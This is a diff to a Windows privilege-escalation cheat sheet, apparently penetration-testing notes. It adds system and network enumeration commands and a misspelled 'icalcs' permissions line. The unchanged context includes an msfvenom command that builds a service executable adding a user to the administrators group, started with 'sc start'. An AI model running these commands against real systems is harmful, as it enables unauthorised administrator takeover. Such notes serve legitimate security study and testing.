@@ -2,7 +2,8 @@
 ## Command line
     systeminfo 
     whoami /priv
-    ipconfig /all     
+    ipconfig /all  
+    route print  
     net users   
     qwinsta                          #is anyone else logged in?   
     net localgroup    
@@ -10,8 +11,10 @@
     tree /a /f    
     set                               #enviromental variables
     net use                           #connected drives  
+    net share                         #shared folders
+    tasklist /v /fi "username eq system"      #tasks running as SYSTEM  
     
-    netstat /anto    
+    netstat -ano    
     netsh firewall show state 
     netsh firewall show config
     
@@ -63,7 +66,8 @@ Generate exe and upload
     msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe  
     sc start service  
 ### Weak Registry Permissions
-### Insecure Service Executables 
+### Insecure Service Executables   
+    icalcs Shared  
     accesschk.exe -uwcqv "Everyone" *
     accesschk.exe -uwcqv "Authenticated Users" *
     accesschk.exe -uwcqv "Users" *
